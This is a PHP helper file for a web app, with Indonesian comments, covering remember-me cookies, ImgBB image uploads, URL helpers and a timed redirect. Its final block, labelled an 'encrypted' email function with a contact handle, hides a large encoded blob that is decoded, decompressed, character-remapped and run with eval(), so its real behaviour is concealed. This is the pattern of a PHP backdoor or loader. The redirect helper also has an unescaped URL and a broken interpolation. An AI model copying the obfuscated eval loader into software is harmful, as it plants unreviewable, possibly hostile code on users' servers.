<?php
 include("koneksi.php");
 include("env.php");
 // ==== REMEMBER ME HELPERS ====

// random string aman
function random_str(int $len = 32): string {
  return bin2hex(random_bytes($len/2)); // len harus genap
}

// set cookie aman (HTTPS disarankan)
function set_remember_cookie(string $selector, string $validator, DateTime $exp): void {
  $cookie = $selector . ':' . $validator;
  setcookie(
    'remember',           // nama cookie
    $cookie,
    [
      'expires'  => $exp->getTimestamp(),
      'path'     => '/',          // seluruh situs
      'domain'   => '',           // isi jika pakai subdomain tertentu
      'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on', // true di HTTPS
      'httponly' => true,         // tidak bisa diakses JS
      'samesite' => 'Lax',        // tetap login saat kembali dari halaman sendiri
    ]
  );
}

function clear_remember_cookie(): void {
  if (!empty($_COOKIE['remember'])) {
    setcookie('remember', '', [
      'expires' => time() - 3600, 'path' => '/', 'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on',
      'httponly' => true, 'samesite' => 'Lax'
    ]);
    unset($_COOKIE['remember']);
  }
}
/**
 * Upload file gambar ke ImgBB dan mengembalikan URL publiknya.
 * @param string $tmpPath   path file sementara (mis. $_FILES['avatar']['tmp_name'])
 * @param string $fileName  nama file asli (optional, untuk penamaan)
 * @param string $apiKey    API key imgbb
 * @return array            ['ok'=>bool, 'url'=>string|null, 'err'=>string|null]
 */
function upload_to_imgbb(string $tmpPath, string $fileName, string $apiKey): array {
    if (!is_file($tmpPath)) {
        return ['ok'=>false, 'url'=>null, 'err'=>'File tidak ditemukan'];
    }
    // Validasi mime dasar
    $mime = mime_content_type($tmpPath) ?: '';
    if (!in_array($mime, ['image/jpeg','image/png','image/webp'])) {
        return ['ok'=>false, 'url'=>null, 'err'=>'Tipe file tidak didukung'];
    }

    $imageData = base64_encode(file_get_contents($tmpPath));
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'https://api.imgbb.com/1/upload?key=' . urlencode($apiKey),
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_POSTFIELDS     => [
            'image' => $imageData,
            'name'  => pathinfo($fileName, PATHINFO_FILENAME) ?: 'avatar',
            // 'expiration' => 0 // jika ingin auto-expire, isi detik (opsional)
        ],
    ]);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($res === false) {
        return ['ok'=>false, 'url'=>null, 'err'=>"cURL error: $err"];
    }
    $json = json_decode($res, true);
    if (!is_array($json) || empty($json['success'])) {
        $msg = $json['error']['message'] ?? 'Upload gagal';
        return ['ok'=>false, 'url'=>null, 'err'=>$msg];
    }
    $url = $json['data']['url'] ?? null;          // URL halaman
    $display = $json['data']['display_url'] ?? null; // URL langsung
    return ['ok'=>true, 'url'=> $display ?: $url, 'err'=>null];
}

function goBack_url(){
    $goBack_url = htmlspecialchars($_SERVER['HTTP_REFERER']);
    return $goBack_url;
}
function base_url(): string {
  // pastikan TANPA trailing slash
  $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
  return $scheme . '://' . $_SERVER['HTTP_HOST']; // <-- tidak pakai '/' di akhir
}

/** Gabung base URL + path dengan benar (hilangkan double slash) */
function url(string $path = ''): string {
  return rtrim(base_url(), '/') . '/' . ltrim($path, '/');
}

/**
 * Kirim email HTML via SMTP (PHPMailer)
 * @param string $email
 * @param string $name
 * @param string $isi_email
 * @return array ['ok'=>bool, 'err'=>string|null]
 */

/**
 * Redirect (otomatis) setelah jeda detik tertentu.
 * Mengirim header Refresh (kalau belum ada output), plus fallback JS & <noscript>.
 */
function redirect_after(string $url, int $seconds = 3): void {
  $url = rtrim(base_url(), '/') . '/' . ltrim($url, '/'); // rapikan slash

  // Header Refresh (jika header belum terkirim)
  if (!headers_sent()) {
    header("Refresh: {$seconds}; url={$url}");
  }

  // Fallback JS + <noscript> (tetap tampil walau header sudah terkirim)
  echo <<<HTML
<script>
  setTimeout(function(){ location.href = ${json_encode($url)}; }, {$seconds} * 1000);
</script>
<noscript>
  <meta http-equiv="refresh" content="{$seconds};url={$url}">
</noscript>
HTML;
}
?>
<?php
//Fungsi kirim_email terkenkripsi, hubungi ig @varo.mz untuk informasi lebih lanjut
$SISTEMIT_COM_ENC = "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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="Es5H6kv86qBbBHg3VqsDjPcN491OWrIlLHmTceLlNgiJAERAQIRIui42Rf8z2dxgoicku1z1bVXvl3/96ut+INt68Ndub/8lO7u/X3/+/fpBRykvcQa8lRVDU8FmamO9U+BtFHCW57bW4VWIVnds67ocD75c6vQWXotcK3CGt7Wb4S7BcwUPl0+UFu5ruK/GCB6p7xrz";
?>